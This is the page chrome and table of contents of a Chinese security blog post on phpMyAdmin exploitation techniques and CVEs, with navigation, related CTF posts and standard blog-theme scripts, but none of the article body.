href="/post/4f3ccb8a.html"><img class="prev-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">buuctf_web部分刷题记录_PART2</div></div></a></div><div class="next-post pull-right"><a href="/post/ef088674.html"><img class="next-cover" src="/img/754566.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常用bypass（待更新）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/ef088674.html" title="常用bypass（待更新）"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-17</div><div class="title">常用bypass（待更新）</div></div></a></div><div><a href="/post/aeaad0f.html" title="Apache的文件解析漏洞(特性)"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">Apache的文件解析漏洞(特性)</div></div></a></div><div><a href="/post/e3611a41.html" title="PHP伪协议"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">PHP伪协议</div></div></a></div><div><a href="/post/e40cde58.html" title="ctfshow刷题_web入门命令执行篇"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-24</div><div class="title">ctfshow刷题_web入门命令执行篇</div></div></a></div><div><a href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-29</div><div class="title">buuctf_web部分刷题记录_PART4</div></div></a></div><div><a href="/post/94662ad7.html" title="SQL注入基础"><img class="cover" src="/img/754566.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-23</div><div class="title">SQL注入基础</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/headddd.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1ustinianus</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Cf4y1d7Ez"><i class="iconfont icon-yu"></i><span>歇会</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:trajanin117@proton.me" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=308450602" target="_blank" title="Music"><i class="fas fa-music"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">1信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96"><span class="toc-text">1.1 版本信息获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E8%8E%B7%E5%8F%96"><span class="toc-text">1.2 绝对路径获取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2PhpMyAdmin%E5%88%A9%E7%94%A8"><span class="toc-text">2PhpMyAdmin利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6GetShell"><span class="toc-text">2.1 写入文件GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6getshell"><span class="toc-text">2.1.1 直接写入文件getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-%E9%80%9A%E8%BF%87%E5%86%99%E5%85%A5%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell"><span class="toc-text">2.1.2 通过写入日志文件getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-%E9%80%9A%E8%BF%87%E6%85%A2%E6%9F%A5%E8%AF%A2%E5%86%99%E5%85%A5webshell"><span class="toc-text">2.1.3 通过慢查询写入webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-User-defined-funct-ion%EF%BC%88UDF%EF%BC%89%EF%BC%9A"><span class="toc-text">2.2 User defined funct ion（UDF）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-MOF%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-text">2.3 MOF提权：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3PhpMyAdmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">3PhpMyAdmin漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-WooYun-2016-199433%EF%BC%9A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">3.1 WooYun-2016-199433：任意文件读取漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-CVE-2014-8959%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">3.2 CVE-2014 -8959：本地文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-CVE-2016-5734-%EF%BC%9A%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE"><span class="toc-text">3.3 CVE-2016-5734 ：后台命令执行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-CVE-2018-12613%EF%BC%9A%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">3.4 CVE-2018-12613：后台文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-CVE-2018-19968%EF%BC%9A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-x2F-RCE"><span class="toc-text">3.5 CVE-2018-19968：任意文件包含&#x2F;RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-CVE-2020-0554%EF%BC%9A%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">3.6 CVE-2020-0554：后台SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-CVE-2019-12922-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">3.7 CVE-2019-12922 跨站请求伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-CVE-2017-1000499-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">3.8 CVE-2017-1000499 跨站请求伪造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E7%89%B9%E6%AE%8A%E7%89%88%E6%9C%ACGetShell"><span class="toc-text">4特殊版本GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-CVE-2013-3238"><span class="toc-text">4.1 CVE-2013-3238</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-CVE-2012-5159"><span class="toc-text">4.2 CVE-2012-5159</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-CVE-2009-1151"><span class="toc-text">4.3 CVE-2009-1151</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">4.4 弱口令&amp;万能密码</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/bc5fabe9.html" title="JAVA学习路线">JAVA学习路线</a><time datetime="2023-07-31T03:26:12.000Z" title="发表于 2023-07-31 11:26:12">2023-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/1a09ef0b.html" title="汇编语言基础知识复习">汇编语言基础知识复习</a><time datetime="2022-10-29T15:33:28.000Z" title="发表于 2022-10-29 23:33:28">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/a65f6ebf.html" title="buuctf_web部分刷题记录_PART4">buuctf_web部分刷题记录_PART4</a><time datetime="2022-10-29T01:04:46.000Z" title="发表于 2022-10-29 09:04:46">2022-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/383bfb1c.html" title="buuctf_web部分刷题记录_PART3">buuctf_web部分刷题记录_PART3</a><time datetime="2022-10-27T01:20:56.000Z" title="发表于 2022-10-27 09:20:56">2022-10-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/4f3ccb8a.html" title="buuctf_web部分刷题记录_PART2">buuctf_web部分刷题记录_PART2</a><time datetime="2022-10-22T13:19:16.000Z" title="发表于 2022-10-22 21:19:16">2022-10-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/1185562.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2014 - 2023 By 1ustinianus</div><div class="footer_custom_text">func YHZ(){const 💕XAQ bool = True},2022.08.09</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="6770516155" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="🤣,😘,🤨,🥱,😣,😤,😭" data-fontsize="25px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>